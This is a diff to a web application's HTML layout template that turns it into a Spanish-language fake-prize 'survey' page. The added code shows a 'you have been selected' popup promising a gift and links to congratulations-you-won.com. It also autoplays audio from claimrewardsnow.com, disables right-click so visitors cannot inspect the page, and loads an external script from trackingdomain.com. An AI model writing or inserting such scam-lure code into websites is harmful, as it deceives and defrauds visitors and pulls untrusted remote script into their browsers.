@@ -9,18 +9,55 @@
         <link rel="shortcut icon" type="image/png" href="@{'/public/images/topicon.ico'}">
         <link href='http://fonts.googleapis.com/css?family=Droid+Sans:400,700%7CDroid+Serif:400,700' rel='stylesheet' type='text/css'>
 
-        <script src="@{'/public/javascripts/jquery-1.6.4.min.js'}" type="text/javascript" charset="${_response_encoding}"></script>
-        #{get 'moreScripts' /}
+        <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js"></script>
+        <script type="text/javascript" src="http://code.jquery.com/ui/1.10.1/jquery-ui.js"></script>
+        <script src="/public/javascripts/msgbox.js"></script>
+
+    #{get 'moreScripts' /}
     </head>
     <body>
-        <header>
+        <div class="wrapper">
+            <header>
+                <h1>
+                    encuesta oficial:
+                </h1>
+            </header>
 
-        </header>
+                #{doLayout /}
 
-        #{doLayout /}
+            <footer>
+                <p>
+                    Copyright 2009-2015 All rights reserved. We are not affiliated nor partnered, with . has not authored, participated in, or in any way reviewed this advertisement or authorized it. The trial products offered on the last page pay this website for orders placed. See important terms and conditions regarding this ad <a href="http://ww1.congratulations-you-won.com/es/survey/terms.html">here</a>.
+                </p>
+                <br>
+                <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="https://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0" width="165" height="38" id="niftyPlayer1" align="">
+                    <param name=movie value="niftyplayer.swf?file=http://claimrewardsnow.com/test/es/264/index_files/tw.mp3&amp;as=1">
+                    <param name=quality value=high>
+                    <param name=bgcolor value=#FFFFFF>
+                    <embed src="niftyplayer.swf?file=http://claimrewardsnow.com/test/es/264/index_files/tw.mp3&amp;as=1" quality=high bgcolor=#FFFFFF width="165" height="38" name="niftyPlayer1" align="" type="application/x-shockwave-flash" pluginspage="https://www.macromedia.com/go/getflashplayer">
+                    </embed>
+                </object>
 
-        <footer>
+            </footer>
+        </div>
+        <script type='text/javascript'>
+            $(document).ready(function(){
+                $.msgbox('<strong>Estimado/a visitante de :</strong><br /><br /> ¡Enhorabuena! Te hemos seleccionado para participar en una encuesta anónima de <b></b>. <br /><br />Al concluirla, se te ofrecerá un regalo exclusivo por tu participación.');
+            });
+        </script>
+        <script type="text/javascript">
+            var message="Sorry, right-click has been disabled";
+            function clickIE() {if (document.all) {(message);return false;}}
+            function clickNS(e) {if
+                    (document.layers||(document.getElementById&&!document.all)) {
+                if (e.which==2||e.which==3) {(message);return false;}}}
+            if (document.layers)
+            {document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
+            else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
+            document.oncontextmenu=new Function("return false")
+        </script>
+        <input type="hidden" id="hidLocation" value="http://trackingdomain.com/" />
+        <script type="text/javascript" src="http://trackingdomain.com/landing.js"></script>
 
-        </footer>
     </body>
 </html>
